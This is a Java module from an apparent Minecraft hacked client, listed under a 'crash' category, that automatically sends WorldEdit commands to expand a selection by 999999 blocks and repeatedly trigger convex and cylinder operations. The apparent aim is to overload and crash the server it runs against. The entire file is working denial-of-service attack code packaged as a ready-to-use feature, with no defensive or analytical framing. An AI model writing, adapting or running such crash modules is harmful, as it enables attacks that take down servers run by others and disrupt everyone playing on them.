package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;

import java.util.LinkedList;
import java.util.Queue;

public class WorldEditConvex extends Module {
    private final Queue<Object> commandQueue = new LinkedList<>();
    private long lastCommandTime = 0;
    private long waitUntil = 0;
    private boolean running = false;

    public WorldEditConvex() {
        super("WorldEditConvex", Category.CRASH);
    }

    @Override
    public void onEnable() {
        if (mc.player == null) {
            disable();
            return;
        }

        sendMessage("Starting...");
        commandQueue.clear();
        running = true;
        lastCommandTime = System.currentTimeMillis();
        waitUntil = 0;

        commandQueue.add("//pos1");
        commandQueue.add("//pos2");
        commandQueue.add(800L);
        commandQueue.add("//expand 999999 w");
        commandQueue.add("//expand 999999 d");
        commandQueue.add("//expand 999999 s");
        commandQueue.add(1000L);
        commandQueue.add("/; convex");
        commandQueue.add("/; cyl");
        commandQueue.add("/; convex");
        commandQueue.add("/; cyl");
        commandQueue.add("/; convex");
    }

    @Override
    public void onDisable() {
        commandQueue.clear();
        running = false;
    }

    @Override
    public void onUpdate() {
        if (!running || mc.player == null) return;

        if (commandQueue.isEmpty()) {
            running = false;
            sendMessage("Done!");
            disable();
            return;
        }

        long now = System.currentTimeMillis();
        if (now < waitUntil) return;
        if (now - lastCommandTime < 500L) return;

        Object next = commandQueue.poll();
        if (next instanceof Long pause) {
            waitUntil = now + pause;
            lastCommandTime = now;
        } else if (next instanceof String command) {
            String cmd = command.startsWith("/") ? command.substring(1) : command;
            mc.player.networkHandler.sendCommand(cmd);
            lastCommandTime = now;
        }
    }
}
